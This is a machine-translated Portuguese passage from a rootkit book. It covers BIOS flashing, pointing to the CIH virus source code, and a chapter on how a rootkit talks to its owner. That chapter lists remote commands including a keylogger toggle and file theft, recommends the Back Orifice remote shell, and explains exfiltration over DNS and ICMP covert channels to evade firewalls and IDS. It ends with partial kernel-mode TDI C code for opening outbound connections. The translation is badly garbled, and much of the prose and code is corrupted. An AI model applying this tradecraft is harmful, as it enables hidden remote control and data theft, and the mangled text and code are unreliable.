http://www.wasm.ru/article.php?article=ab_flashbios_i 
- Artigo sobre a gravação da memória flash; 
• 
http://www.wasm.ru/article.php?article=1013002- Univer
Senhas sebáceas do BIOS, caso você precise selecionar PA
A função (no entanto, senhas aqui, deve -se notar, um pouco desatualizada); 
• 
h t p: // www.Winsov.RU/BIOS .PHP - Várias documentação sobre 
BIOS; 
• 
O código -fonte do vírus Win95.CIH. 
OBSERVAÇÃO. 
Win95.cih é um dos vírus mais elegantes e maliciosos do século passado,
O aniversário do acidente na usina nuclear de Chernobyl em 26 de abril de 1999. 
A descrição do vírus e até seu código -fonte são fáceis de encontrar na Internet.E este 
O código -fonte está completo (você não precisa adicionar nada) e é compilado sem 
problemas especiais.Para compilação, você precisa de Tasm (montador turbo). 
A fonte win95.cih descreve em detalhes o processo de gravação (mais precisamente, lavando a lavagem
Nia) BIOS, ignorando mecanismos de proteção do BIOS.Verdadeiro, Wash Bios V
Rus pode apenas em máquinas antigas que tinham difundida generalizada 
em 1999.Ele usa métodos de acesso ao BIOS fornecidos uma vez
Chipsets pessoais (principalmente Intel 430 VX, TX e outros). 
Mas você pode emprestar os princípios gerais de acesso ao BIOS de 
WIN95.CIH. 
9.3.2.Experimento malsucedido.O que fazer? 
Muitas vezes acontece que, como resultado de um experimento malsucedido conduzido sobre 
Seu próprio computador, geralmente para de carregar, porque você 
BIOS danificados.O que fazer?Existem diferentes maneiras de diferentes biografias 
sua restauração.Você pode ler sobre eles no guia materno
Treinador, ou no site de seu fabricante.Vamos considerar universal 
Um método que trabalha com todos os BIOS registrados na memória flash. 
211

pagina: 211

Rootkits 
Uma maneira clássica é o uso de um programador.Você encontra 
Na internet, você precisa da versão do BIOS (geralmente pode ser baixado do site 
fabricante da placa -mãe) e com a ajuda do programador "
Vete ”ela de volta à memória flash.Mas, como sempre, algo está faltando: ou 
O programador (este dispositivo é mantido na "fazenda", nem todos), ou 
Conhecimento sobre qual versão do BIOS foi estabelecida por você. 
Então você precisa encontrar a mesma placa -mãe.Se o seu computador 
não muito antigo, mas, digamos, para ele um ano e meio, encontre a mesma mãe
Não será difícil fazer uma taxa: será para seus amigos ou naquele Ma
Gazin onde você comprou um computador.Não, compre uma placa -mãe 
não há necessidade.Existe um método muito mais simples e barato - esta operação é para você 
custará algumas garrafas de álcool para trazer seu conhecimento ao sentido de
Porque, quando ele descobre o que você quer fazer com a placa -mãe. 
E você precisa fazer isso.Dê seu BIOS.Experimente não 
dano, caso contrário, você só terá que comprar um novo materno 
taxa.Em seguida, puxe o BIOS da placa -mãe de um amigo (ao mesmo tempo 
Tente não confundi -los). 
Amarre o biograf 
placa -mãe.São necessários tópicos para retirar rapidamente o BIOS, 
Quando necessário. 
Certifique -se de que Jampers que permitem que a placa -mãe esteja instalada na placa -mãe 
Gravar bios (se houver).Se o seu conselho usar o programa
Proteção de gravação do BIOS, então ele precisa ser desligado no programa de configuração 
Mesmo antes de obter BIOS do computador do seu amigo. 
Execute seu computador.Você precisa baixar o dos "nus" - sem nenhum 
Janelas.Em seguida, iniciamos um programa como awdflash - ele pode ser baixado para 
O local do fabricante da placa -mãe.Ela deve ser capaz de gravar bios 
Completamente, e não apenas qualquer parte disso.Selecione o menu do programa 
Opção de conservação do BIOS.O BIOS é melhor preservado em um disco (desejo
É para que o próprio programa esteja no disquete).Deixe o programa. 
Agora o clímax está chegando!Retire -se com um movimento nítido 
Atrás dos fios com os quais você amarrou o micro flash de outra pessoa.Melhor para 
Ao mesmo tempo, seu computador estava no chão ou na mesa, e não permaneceu uma vertical
Mas.Depois disso, insira seu (não trabalhador) 
BIOS.Se suas mãos estão tremendo de emoção, peça isso para fazer alguém-
Qualquer outro.Eu não estou brincando.O computador está ligado se você inserir bios 
de alguma forma errado, então você pode fechar alguma coisa, e então precisará
Bata não apenas a placa -mãe.Você pode inserir biografias, mas 
Exatamente - para que cada uma de sua perna esteja claramente em contato com seu ninho.COM 
212

pagina: 212

Capítulo 9. Recarregamento 
Dos nada vai acontecer - o BIOS é necessário apenas ao carregar.Correr 
O programa de gravação e registre o BIOS que você acabou de gravar. 
É isso, você pode desligar a energia e inserir BIOS normalmente. 
O método está funcionando, mas nem eu nem a editora somos responsáveis ​​por 
Se você fez algo errado.Antes de usá -lo, por
Pense - você pode definitivamente instalar bios quando o caroço estiver ligado
Pudher?Se você duvidar, é melhor encontrar algum lugar no mesmo materno 
taxa, extraia um trabalhador e vá para alguma empresa onde 
Existe um programador.Lá eles vão gravar seu BIOS.Este serviço custa de 5 para 
10 dólares. 
213

pagina: 213

Capítulo 10. 
Rutkin 
Corrige com 
mestre 
• 
Canais secretos 
• 
Vamos ao nível do núcleo. 
Interface TDI 
Rootkits

pagina: 215

Você ainda se lembra que a tarefa de Rutkita não é apenas para se esconder, mas 
E fornecer ao seu proprietário acesso remoto a um vítima-victim? 
Para fazer isso, o rutkit deve incluir um módulo projetado para 
Trabalhe com a rede.Neste capítulo, falaremos sobre a interação da rede
twei. 
O acesso remoto é necessário para o proprietário da Rutkita para gerenciar o software 
fornecendo um computador e para copiar 
arquivos para você e de si mesmo.Copiar arquivos para si mesmo às vezes é chamado de ex-
Filtração de dados. 
Você pode trabalhar com uma rede no Windows no nível do usuário e no nível 
Núcleos.No nível do núcleo, você tem muito mais oportunidades do que Paul
nível de chamada.Além disso, no nível do núcleo, é muito nponie 
Ações dos olhos dos IDs locais. 
Mas no nível do usuário, você pode ocultar efeito suficiente
É possível se você transferir seus dados através de canais secretos.Neste capítulo I 
Primeiro, te darei uma idéia teórica de canais secretos e depois 
Eu irei para a parte prática - ocultação no nível do núcleo. 
10.1.Canais secretos 
10.1.1.O que vamos transmitir? 
Você pode criar um conjunto de comandos de controle para sua raiz, por exemplo: 
• 
Desligamento - desligue o computador; 
• 
Reiniciar - reiniciar o computador; 
216

pagina: 216

Capítulo 10. Rutkit corresponde ao proprietário 
• 
Ativar (desativar) Sniffer - Ligue (desligue) o teclado para o teclado; 
• 
ocultar <Program> - Inicie e oculte o programa; 
• 
Get <File> - Faça o download do arquivo do computador; 
• 
Coloque <File> - Carregue o arquivo no computador. 
L PODE INCLUIAR OS SOMENTO REMOTO DE SO 
Isto é, a sessão do TCP conectada aos sistas do intérprete de comando
Nós.No Windows, é cmd.exe e em unix/linux -/bin/bash ou/bin/sh. 
Neste último caso, você não precisa pensar em quais equipes com antecedência 
Você precisará e programá -los: você pode cumprir qualquer
Manda como se você trabalhasse diretamente no computador. 
Se você escrever seu próprio shell remoto, você pode dar
Use soluções prontas -feitas.Para o Windows o mais popular
A concha remota de Noah está de volta ao orifício.Seu nome é o jogo de palavras 
O nome da paródia do produto Microsoft BackOffice.Apenas lembre -se disso 
As conchas populares também são conhecidas pelos produtores de antivírus.Se 
O antivírus no computador não está instalado, então o orifício traseiro serão ideias
Decisão de Alnom.Com sua ajuda, você pode obter um controle remoto completo 
Acesso ao computador, não apenas uma interface de comando miserável
Tator.Com uma boa conexão de rede com o orifício traseiro, você pode até 
Ouça a música reproduzida por um computador remoto - certo 
Por que carregar o seu? 
As desvantagens das soluções prontas para uso incluem dois pontos.Primeiramente, 
Eles geralmente são muito volumosos devido à sobrecarga 
funções que você nunca precisará: para virar a tela do bem
Vatel de cabeça para baixo, abra a bandeja de CD-ROM, formate o disco rígido 
etc. Na rede real onde você deseja esconder sua presença, essas funções 
Você não pode usá -lo.Além disso, quanto mais complicado o programa, mais 
Geralmente tem erros. 
A segunda desvantagem é um fator de confiança.Você confia completamente no surto
Sapatos desses programas?Você sabe o que eles têm em suas mentes?Alguns são removidos
As conchas de NY infectam ao mesmo tempo o atacante: enquanto você está
Você trota o computador da vítima, o desenvolvedor da Shell controla você. 
A própria concha diz a ele sobre sua presença em seu computador, 
Assim que ele chega à rede.Portanto, do ponto de vista de sua segurança 
É mais lucrativo escrever uma concha de acesso remoto por conta própria. 
Então, vamos usar o canal secreto para transferir para Rutkin 
Comandos e download comandos de um Victim de computador. 
217

pagina: 217

Rootkits
10.1.2.A chave para segredo - Steganografia
Do ponto de vista de Rutkin, o canal secreto é uma marcha de comunicação
Ruth, permitindo "se locomover" no firewall (IDs, Sniffers de rede e outros
mecanismos de segurança).
É melhor usar um canal secreto do que criar e ocultar o usual.
Por que?Imagine que você está quebrando a porta do apartamento.O que é mais lucrativo
- Aplique uma chave mestre ou bata na porta?É isso mesmo, é melhor fazer um mestre
Se derrubamos a porta, faremos tanto barulho que
Todos os vizinhos estão olhando.Então, a abertura do TCR Soctet (se criarmos
sua própria conexão comum) fará o mesmo número de ruído como se
Nós batemos pela porta.
A operação da abertura da Socte TCR imediatamente "iluminam" como no núcleo (talvez
HIPS é encontrado) e na rede (os IDs de rede serão interceptados).Criação
TSR Soctet é muito "barulhento", porque devido a esta operação, é criado
Syn-pack, e então tudo isso é acompanhado pelo famoso "triplo
aperto de mão. "
Considere como a conexão TCP é criada entre os dois nós.Inicialmente
O cliente envia um pacote TCP com o sinalizador instalado de Syn (sincronização).
Após o recebimento desse pacote, o servidor envia ao cliente um pacote com um instalado
NY Sinalizadores Syn e Ask (reconhecimento - confirmação).E finalmente
O cliente envia um pacote com sua bandeira de confirmação de Ask.Composto
Foi estabelecido que os dados podem ser transmitidos.O mecanismo de instalação da conexão TCR
Chamado "Triple Handshake".
Se o cliente não responder com seu pacote, peça ao pacote do servidor syn-ck, então
O servidor aguardará algum tempo (geralmente 180 segundos) e se recusará com
Unidade.
Agora você entende por que a criação de um segundo TCR é indesejável?Rede
A atividade decorrente de um aperto de mão triplo será imediatamente
Notado por um firewall ou IDs de rede.
Além disso, mesmo que ocultamos habilmente o canal TCP usual - para que
não "verá" os IDs locais - então na rede essa conexão ainda será sobre
Determinado pelo firewall ou IDs de rede.
Então, para uma conexão secreta, usaremos a criatura
canais, aqueles que são permitidos pelo firewall.Você pode pere
Dê nossos dados no pacote DNS.Nesse caso, você precisa lembrar que se
A resposta do servidor excede 512 bytes, os pacotes DNS não são mais transmitidos
De acordo com o protocolo UDP, e no TCP.Este sou eu para garantir que você não exagere e
218

pagina: 218

Capítulo 10. Rutkit corresponde ao proprietário 
Eles não criaram um ato de 600 (ou mais) bytes.Neste caso já 
Você precisa usar o pacote TCR. 
Arroz.10.1.Instalação da conexão TCR 
Também pode ser usado para transmitir nossas informações da web-proto
Coll: Portas 80 (HTTP regular) e 443 (HTTPS criptografado).Todos estes 
Os protocolos geralmente são passados ​​pelo firewall sem problemas. 
Mas você deve se lembrar que alguns firewalls intelectuais 
(ou IDs de rede) Analise não apenas os cabeçalhos da embalagem (porta, endereço 
Destinatário e remetente), mas também o conteúdo do pacote.Nesse caso
Use mais respeitosamente SSL (porta 443) - Então seus dados já são precisos
Mas ninguém vai ler.Embora exista uma exceção.Existem soluções, 
permitindo decifrar sessões SSL, como Ettercap (H t p: / / / / / / / / / / / / / / 
ettercap.sourceforge.net), mas eles raramente são usados ​​como administrador
Tators e IDs. 
Nós nos aproximamos da coisa principal: como esconder nossa comunicação, se for sobre
Está no canal oficial?Steganografia vai nos ajudar aqui, então 
Existe um tipo de criptografia que oculta não apenas contém
a mensagem, mas o próprio fato de sua transmissão.Por exemplo, você pode se esconder 
Mensagem de texto em outro arquivo de texto, codificando -o com diferente 
O comprimento das lacunas.Tudo o que é necessário para criar um esteagonograma é 
Encontre um meio de mensagem adequado (arquivo de arquivo), "aparência" 
que após a introdução da mensagem praticamente não mudará. 
219

pagina: 219

Rootkits 
Na maioria das vezes, outros contêineres são arquivos gráficos.Imagine 
Imagem de uma coragem: um byte em um pixel.Se você mudar o oitavo, sa
Um pequeno, um pouco desse byte, então o brilho do pixel mudará tão pouco, 
que o usuário não notará nenhuma alteração a olho nu. 
Mas os arquivos gráficos foram projetados para considerar o Noo
Olho arredondado!Além disso, essa manipulação também não é para o tamanho do arquivo 
vai afetar.Isto é, a mensagem apresentada como uma cadeia de bits pode ser 
Coloque as imagens no arquivo, substituindo -as pelos últimos bits 
Píxeis. 
E no nosso caso, o canal de transmissão oficial desempenhará o papel do contêiner 
dados. 
As regras gerais para transferência de dados por canais secretos são os seguintes: 
• 
Considere a hora do dia e o tamanho do tráfego transmitido.Pré
Mentimos que Rutkit está bombeando os dados de que precisa de manhã cedo, 
Digamos às 5 ou 6 da manhã (ou tarde da noite).Neste momento, ninguém 
Funciona, então o administrador do sistema pode ter 
suspeitas - que iniciaram um fluxo de tráfego neste momento
meu?Muitos administradores de rede têm monitores de rede -
Gramas que controlam fluxos de tráfego.Eles são instalados com 
O objetivo da contabilidade, mas como um bônus, eles podem ajudar a identificar o rootkit. 
• 
Nunca envie dados não criptografados.Imagine isso 
Os comandos de reinicialização ou desligamento serão transmitidos por aberto
volume.E depois de receber esses comandos, o computador é "por algum motivo" 
Recarregar.Não está claro que existe um rootkit nele?Rede 
O administrador não precisará de muito tempo para determinar 
Esse.Para transferir comandos de gerenciamento, você pode usar o SIS
O tema da codificação, por exemplo, equipe a significa reiniciar e 
A equipe GR é a conclusão do trabalho.Para arquivos de transferência que você precisa
Para usar algum algoritmo de criptografia. 
10.1.3.Escondemos os dados em verificações de DNS 
Para transmitir uma pequena quantidade de dados (por exemplo, comandos rutkita) idéias
Os pacotes DNS são adequados.Primeiro, se o tamanho do pacote não exceder 
512 bytes, o protocolo UDP não requer um aperto de mão triplo
Tia.Em segundo lugar, para pacotes UDP, você pode usar o SPOOL (SPOOFING) 
- Substituição do endereço.Como o UDP não requer um aperto de mão triplo, 
Usar uma nave espacial para pacotes UDP é muito mais fácil do que para o TCP. 
Em terceiro lugar, as consultas do DNS são passadas sem qualquer coisa que se ponha 
220

pagina: 220

Capítulo 10. Rutkit corresponde ao proprietário 
firewall.Para nós, a última vantagem deste método é especialmente importante 
Organização do canal secreto. 
Agora li cuidadosamente o próximo texto: 
Até o momento, sabíamos como ocultar a conexão TCP usando
Revat IRP pacotes (parágrafo 6.4).Se o sistema da vítima estiver instalado apenas 
IDs locais, então a conexão pode ser considerada oculta de maneira confiável.Mas de 
IDs de rede ou firewall configurado corretamente esta tecnologia não é 
Salvar.É para ignorar os IDs de rede que a tecnologia de Secret KA serve
O portador que estamos considerando nesta seção. 
Os canais secretos foram usados ​​pela primeira vez em militares distribuídos 
Sistemas para transmitir mensagens secretas. 
Parece que um texto completamente inocente, mas é oculto segredo 
palavra.Qual?Siga suas mãos: 
Para o presente ... 
Se... 
Mas... 
\\ 
Segredo ... 
A mensagem forma as primeiras letras de cada frase.Semelhante 
Você pode usar as estacas DNS (Fig. 10.2). 
Suponha que precisamos transmitir a linha 'den' - em nosso exemplo, ela serve 
Senha para acesso ao Rutkitus, transferimos três consultas DNS em permissões
vários nomes de domínio, por exemplo, dkws.Narod.ru, e l e c t r o n i c, 
Google.Com e n i t.Com.ru.Nossa mensagem está codificada no primeiro livro
O que de nomes de domínio transmitidos. 
Como você pode ver, tudo é simples.Como vamos transmitir solicitações, não precisamos 
Cuide da existência de tais nomes.Basta criar uma matriz de 26 para
Nomes de troca, um por um nome para a letra, e combine mensagens com ajuda
esta matriz.Obviamente, para permanecer despercebido, você precisa de um regulamento
O fio das linhas de matriz semelhante aos nomes de domínio não é abracadabra, 
E pelo menos Abra.Cadabra.Com. 
Obviamente, a Steganografia é adequada para transmitir pequenos textos - em
Um exemplo das equipes de gerenciamento do Rutkit.O arquivo baixado é melhor para implementar 
Em sessões SSL codificadas. 
\ 
221

pagina: 221

Rootkits 
Além do DNS, os ICMPs são frequentemente usados ​​para organizar canais secretos
pacotes.Aqui estão apenas algumas fontes que lhe darão a chave para a distância
para o mais pensamento. 
• 
Programa ECHOART (http://mirrorl.internap.com/echoart) 
responde ao eco-questionamento ou os ignora de acordo com o pôster dado
Gelo de unidades e zeros.O remetente de eco 
Seguindo o destino dos pacotes, calcule essa sequência. 
• 
Programa Loki2 (http://www.phrack.org/phrack/51/p51-06) 
Comandos de embalagem do intérprete de comando no não utilizado
Pólos de pacotes 1SMR_SN0 e ICMP_ECH0REPLY. 
• 
Artigo 
h t p p: / / e e e e.C o m / ~ d a t a / p u b l i s h / w i t e p a p e r s / 
Pesquisa/OT20050205.Arquivo .pdf mostra como intervir em 
O trabalho do driver TCPIP.SYS, substituindo o manipulador de pacotes ICMP 
para que o conteúdo do buffer a cada eco 
Teclado. 
Título 
TCP/IP 
Título 
TCP/IP 
Título 
TCP/IP 
Título 
Dns 
Solicitar 
dkws.Narod.ru 
Título 
Dns 
Solicitar 
Electronic.google.com 
Título 
Dns 
Solicitar 
nit.com.ru 
D. 
e 
P 
Arroz.10.2.Steganografia c 
Verificações de DNS 
10.2.Vamos ao nível do núcleo.Interface TDI 
No nível do núcleo, duas interfaces principais estão disponíveis para você: 
• 
TDI (interface do dispositivo de transferência) - interface do dispositivo de transporte; 
• 
NDIS (especificação da interface do driver de rede) - Interface de rede 
Motoristas. 
O TDI tem uma vantagem indiscutível: esta interface usa 
A pilha TCP/IP existente e você não precisa inventar a bicicleta
, Desenvolvendo seu próprio vidro de protocolos. 
222

pagina: 222

Capítulo 10. Rutkit corresponde ao proprietário 
Por outro lado, você pode contornar os IDs locais apenas com NDIS, permitir
Para ler e escrever "Raw" (não processado antes) 
pacotes.Mas no caso do NDIS, você precisa gastar um certo tempo para 
Escreva sua própria pilha TCP/IP. 
A arquitetura geral do TDI/NDIS se parece com isso. 
Cliente TDI 
Dispositivo de transporte 
Interface 
Outro 
Interfaces 
Driver de protocolo NDIS 
Interface NDIS (especificação da interface do driver de rede) 
1 
Driver de nível intermediário) ndis 
Interface NDIS (especificação da interface do driver de rede) 
NDIS Mini Port Driver 
Interface NDIS (especificação da interface do driver de rede) 
Outros motoristas, hardware 
Arroz.10.3.Arquitetura TDI/NDIS 
O TDI é uma interface que permite que você trabalhe com uma unidade compatível com TDI
rum.Deve -se notar imediatamente que há pouca documentação para TDI, em 
Quase não há russo em russo.Portanto, leia com muito cuidado 
Comentários sobre todo o código que escreveremos nesta seção. 
223

pagina: 223

Rootkits 
Vamos escrever um cliente TDI, ou seja, o motorista que estará sob
Beba em um servidor remoto (não importa qual: web ou ftp), use
Interface Zuya TDI.Agora vamos desenvolver um conjunto de funções que 
Você pode usar em seus projetos TDI.Por que pagar dinheiro por 
Bibliotecas comerciais se pudermos escrever o nosso? 
10.2.1.Descritor de endereço de transporte 
Primeiro de tudo, o cliente deve abrir o descritor do endereço de transporte. 
O endereço de transporte significa o endereço IP da máquina local 
(não remoto!).Para simplificar a tarefa, podemos permitir o sistema 
Defina o endereço - para isso, você só precisa especificar o endereço 
0.0.0.0. 
O objeto do endereço local é um arquivo que abrimos com uma chamada 
Funções zwcreatefile.Ao criar um objeto de um endereço local, você precisa 
Também indicará seus atributos expandidos que serão transmitidos 
Driver através do IRP_MJ_CREATE. 
R e s e r e n e e 
um tr e b u t 
x r e n t s i 
V 
C tr u t u r e 
Fi l e _ _ f u l l _ e _ i n f o r m a t i o n: 
Typedef struct _file_full_ea_information 
{ 
Ulong NextEntryoffset; 
Sinalizadores uchar; 
UChar eanameLength; 
Ushort eaname [l]; 
) File_full_ea_information, *pfile_full_ea_information; 
Como nossa tarefa é apenas a criação de uma conexão com o cliente
Nia, não podemos indicar a porta local (porta = 0).Remoto para nós, 
Obviamente, será necessário indicar, mas não agora. 
É melhor ver o código uma vez do que ler a teoria cem vezes, então sim
Daure considere imediatamente a função criando um objeto do endereço local 
(Listagem 10.1).Leia os comentários com cuidado - será em vez disso 
Teorias. 
Listagem 10.1.Abrindo o transcriptor do endereço de transporte 
#include "tdi.h" 
Ntstatus OpentransportAddress (Phandle ptdihandle, 
Pfile_object *pfileObject) 
224

pagina: 224

Capítulo 10. Rutkit corresponde ao proprietário 
( 
Ntstatus s = statatus_insob comaficiente_resources; 
// o nome da unidade TDI 
Unicode_string tdidrivername; 
// atributos estendidos do objeto do endereço local 
Object_attributes EA; 
Io_status_block iostatus; 
// bloco de dados 
Char datablob [sizeof (file_full_ea_information) + 
Tdi_transport_address_length + 300] = {0} 
; 
// informações sobre atributos expandidos 
Pfile_full_ea_information peainfo = 
(Pfile_full_ea_information) sdatablob; 
UINT faseize = 0;// tamanho ea 
PTransport_address pta = null;// Endereço de transporte 
/* 
Estrutura 
Ta_transport_address 
deve 
conter 
Embora 
seria 
Um 
estrutura 
Tdi_address_ip 
(Vários - se houver vários carros locais 
interfaces e, portanto, vários endereços IP).Estrutura tdi_ 
Endereço_IP pode ser entendido como um análogo da estrutura de Sockadddr_in, que 
Usado no nível do usuário. 
V 
Ptdi_address_ip ptdilp = null;// Endereço de IP 
Rtllnitunicodestring (STDIDRIVERNAME, L "\\ Device \\ TCP"); 
// inicialize os atributos do objeto 
/* 
Obj_case_insensitive 
- insensividade 
Para o registro 
símbolos 
linhas definidas pelo segundo parâmetro; 
Obj_kernel_handle - O descritor deve estar disponível apenas no modo 
Núcleos 
*/ 
InitializeObjecttttributes (mar, stdidrivername, 
Obj_case_insensitive | 
Obj_kernel_handle, nulo, nulo); 
/* Depois disso, precisamos inicializar a estrutura de expansão 
atributos 
Eaname 
= TditransportAddress, 0, transport_address 
EanameLength = TditransportAddress Comprimento 
Evaluel comprimento = comprimento transport_address 
*/ 
Rtlcopymememory (& peinfo-> eanome, tditransportAddress 
Tdi_transport_address_length) 
; 
Peainfo-> eanameLength = tdi_transport_address_length; 
Peainfo-> eavaluelgen = tdi_transport_address_length + 
Sizeof (transport_address) + 
sizeof (tdi_address_ip); 
PTA = (pTransport_address) (speainfo-> eaname + 
Tdi_transport_address_length + 1) 
; 
/* 
Número de endereços 
8 Zak. 
665 
225

pagina: 225

Rootkits 
*/ 
Pta-> taaddressCount = i; 
/* 
Preenchemos o endereço de transporte (TA): 
Endereço 
= Tipo de endereço 
Endereço = comprimento do endereço 
Endereço = estrutura de dados correspondente ao endereço do endereço 
*/ 
Pta-> endereço [0] .AddressStype 
= Tdi_address_type_ip; 
Pta-> endereço [0] .AddressLength 
= sizeof (tdi_address_ip); 
ptdilp = (tdi_address_ip *) & PTA-> Adms [0] .Address; 
/* 
Estrutura 
Tdi_address_ip 
Como 
estrutura 
Soquete 
sobre 
Nível de usuário: 
sin_port 
sin_zero 
in_addr 
Lembre -se: este é o endereço local do carro.Portanto, a maneira mais fácil de indicar 
0.0.0.0, para que o próprio sistema defina o endereço correto.Mesmo 
O mais se aplica à porta - se você indicar 0, o próprio sistema escolherá 
Porto Livre.Claro, se houver várias redes 
interfaces (
Cada interface terá seu próprio endereço IP), então neste 
O caso deve ser especificado pelo endereço IP manualmente. 
Simplesmente rejeitamos os valores de seus membros: 
*/ 
Rtlzeromemery (ptddilp, sizeof (tdi_address_ip)); 
Easize = sizeof (datablob); 
// Crie um arquivo para o objeto do endereço local 
S = zwcreatefile (ptdihandle, file_read_ea | file_write_ea, 
& Ea, slostatus, null, file_attribute_normal, 0, 
File_open_if, 0, 
Peainfo, facilmente); 
if_success (s)) 
{ 
// Crie um objeto de endereço local 
S. 
= ObreferenceObjectByHandle (*ptdiHandle, 
Geneeric_read | 
Geneeric_write, 
Nulo, 
Kernelmode, 
(Pvoid*) pfileObject, nulo); 
if (! nt_success (s)) 
{ 
Zwclose (*ptdiHandle); 
} 
} 
Retorno s; 
} 
226

pagina: 226

Capítulo 10. Rutkit corresponde ao proprietário 
Eu acho que tudo deve ficar claro para você.A função da função é cem por cento 
Trabalhando.Se você estiver interessado nos significados permitidos de alguns 
Certos parâmetros de uma função específica, você pode encontrá -los 
Descrição na documentação do MSDN, que se reúne com o seu 
DDK.Se você não tem no momento na mão desta informação, 
Veja o site msdn.microsoft.com. 
10.2.2.Abrindo o contexto da conexão 
A próxima etapa depois de criar o descritor do endereço de transporte 
A criação do contexto da conexão deve ser.Este é apenas um descritor 
compostos que você indicará em várias operações
bot com esta conexão.Cada conexão tem seu próprio descritor, ou seja 
contexto. 
Para criar o contexto da conexão, também usaremos sistemas
uma chamada zwcreatefile e para o mesmo dispositivo \ dispositivo \ tcp. 
Não há nada de errado com isso - é permitido criar até três descritores 
Para o mesmo dispositivo.Já criamos uma descrição de transporte
Thor, agora criaremos um descritor de contexto e um pouco mais tarde - o descritor 
gerenciamento. 
Mas como o sistema distingue esses três descritores?Afinal, todos eles se relacionam com 
um e o mesmo dispositivo.E o segredo é o seguinte: para cada descritor 
Usaremos diferentes atributos expandidos (EA).Se o motorista 
não indica atributos expandidos, então o descritor é criado 
O padrão que é o descritor de controle.Esta abordagem é descrita 
B m s d n. 
Considere a função da OpenConnction (Listagem 10.2), que cria o
O texto da conexão, isto é, realmente abrindo a conexão.Ponteiro 
C0nnection_context é apenas um ponteiro para um usuário 
Estrutura de dados. 
Listagem 10.2.Abrindo o contexto da conexão 
Ntstatus OpenConnection (phandle ptdihandle, 
Pfilejobject *pfileObject) 
f 
Ntstatus s = statatus_insob comaficiente_resources; 
Object_attributes EA; 
Io_status_block iostatus; 
Unicode_string tdidrivername; 
Char datablobfSizeof (arquivo EA completo) + 
227

pagina: 227

Rootkits 
Tdi_connection_context_length + 300] = {0}; 
Pfile_full_ea_information 
Peainfo 
= 
(Pfile_full_ea_ 
Informação) sdatablob; 
UINT faseize = 0; 
Rtllnitunicodestring (sustentrivernamestring, l "\\ dispositivo \\ tcp"); 
// inicialize a estrutura objeto_attributes 
InitializeObjecttttributes (mar, stdidrivername, 
Obj_case_insensitive | 
Obj_kernel_handle, nulo, nulo); 
/* Depois disso, devemos preencher a estrutura de Peainfo da seguinte maneira: 
Eaname 
= TdiconnectionContext, 0, dados do usuário 
(ponteiro) 
EanameLength = TDICONNECTIONCONTEXT Comprimento 
Evaluel comprimento = comprimento total 
*/ 
Rtlcopymememory (& peinfo-> eanome, tdiconnectionContext, 
Tdi_connection_context_length); 
Peainfo-> eanameLength = tdi_connection_context_length; 
Peainfo-> eavaluelgen = tdi_connection_context_length; 
Facente = sizeof 
(Datablob); 
S = zwcreatefilefptdihandle, file_read_ea | 
File_write_ea, mar, 
Slostatus, null, file_attribute_normal, 0, file_open_if, 0, 
Peainfo, facilmente); 
if_success 
(s)) 
{ 
S = obreferenceObjectByHandle (*ptdiHandle, 
Geneeric_read | 
Geneeric_write, 
Nulo, kernelmode, (pvoid *) pfileObject, nulo); 
if (! nt_success (s)) 
{ 
Zwclose 
(*ptdiHandle); 
} 
1 
Retorno s; 
} 
10.2.3.Conectamos o endereço de transporte e o contexto da conexão 
Para que a conexão seja usada, você precisa amarrar
O descritor do endereço de transporte e o contexto da conexão.Esta etapa 
É necessário executar imediatamente após a criação bem -sucedida de ambos os descritores. 
Para vincular descritores, você precisa entrar em contato com o subjacente 
O motorista é o driver TD1.A conexão entre os dois motoristas, como sempre, 
É realizado através do IOCTL.Este procedimento é familiar para você, então não 
Vamos nos debruçar sobre isso.Em suma, vou dizer apenas que precisamos sair
Despeje o pacote IRP, preencha -o com os parâmetros necessários e envie -o 
dispositivo.Todas essas ações são executadas por nossa função de link (Listagem 10.3), 
228

pagina: 228

Capítulo 10. Rutkit corresponde ao proprietário
Tomando dois parâmetros - o deskriciper do endereço de transporte e
Contexto da conexão.
Listagem 10.3.Vincular o endereço de transporte com o contexto da conexão
Link ntstatus (manipulação hta, conexão pfilej3bject)
{
Ntstatus s = statatus_insob comaficiente_resources;
PIRP PLRP;
Pdevicejdbject ptdidevice;
TDI_COMPLOTION_CONTEXT COMPECONTEXT;
Io_status_block iostatus = fo};
// Inicialize o evento de aviso
KelnitializeEvenente (ScompContext.kcompletevent, notificação,
FALSO);
// Obtenha o objeto do dispositivo TDI
ptdidevice = ioGeTreLatedEviceObject (conexão);
/* Formulário IRP.Para isso, o TDI fornece várias macros
e funções,
permitindo que você crie rapidamente o IRP adequado para a nossa tarefa.
Você encontrará uma descrição detalhada dessas macros no endereço
http://msdn.microsoft.com/library/en-us/network/hh/network/
34BLDMAC_F4308
60A-9AE2-4
37
9-BFFC-6BOA81092E7C.XML.
ASP?
*/
PLRP = TDIBULDLNTERNALDEVICONTROLIRP (tdi_associate_address,
Ptdidevice, conexão, scompcontext.kcompletevent,
Slostatus);
if (plrp)
{
// Adicionar parâmetros ao IRP
TdibuildassociatEaddress (PLRP, ptdidevice,
Conexão, nula, nula,
HTA);
Afirmar (
KegetCurrentlrql () <= despacho_level);
S = icalldriver (ptdidevice, PLRP);
/* Se o status retornado for status_pending, então o IRP não foi
processado e o motorista o colocou na fila do IRP para mais
em processamento.Vamos esperar até que o motorista processe nosso IRP
Para fazer isso, definimos o evento final - KCompleteevent
O evento ocorrerá quando o processamento do nosso IRP for concluído
*/
if (s == status_pending)
{
KewaitforsingleObject (scompcontext.kcompletevent,
Executivo, Kernelmode, falso, nulo);
S = iostatusblock.status;
229

pagina: 229

Rootkits
Retorno s;
10.2.4.Combinar
Chegamos perto do longo momento de conexão com muito
servidor remoto.Eu acho que até esse momento você já sentiu
Toda a dificuldade de trabalhar com uma rede no nível do núcleo.Espero que estejamos agora
Chamaremos a função Connect-Analog, como no nível do usuário, e isso é tudo?
Não estava lá.Sim, a função será uma, mas nós mesmos escreveremos.Depois
Você pode usá -lo indicando o contexto da conexão, endereço IP
Porta de servidor e servidor.Deixe -me lembrá -lo que converter uma string contendo
Endereços IP, nas funções necessárias, o valor pode estar usando a função
INET addr (string de endereço IP).
Listagem 10.4.Instalação da conexão
Ntstatus tdi_connect (pfile_object connextion, endereço uint, ushort
Porta)
{
Ntstatus s = statatus_insob comaficiente_resources;
I0_status_bl0ck ostatatus =
{0);
Pdevicejdbject ptdidevice;
PIRP PLRP;
// RTCI - Retornar informações de conexão
Tdi_connection_information
Rtci = {0}
;
// RCI - Solicitar informações de conexão
Informações de conexão TDI rci = {{
0}
;
// Número de segundos
// O tempo acabou
Segundos uint = 60*3;
LIGLE_INTEGER Timeout =
{0};
Char Cbuffer [256] = {0}
;
Ptdi_address_ip ptdilp;
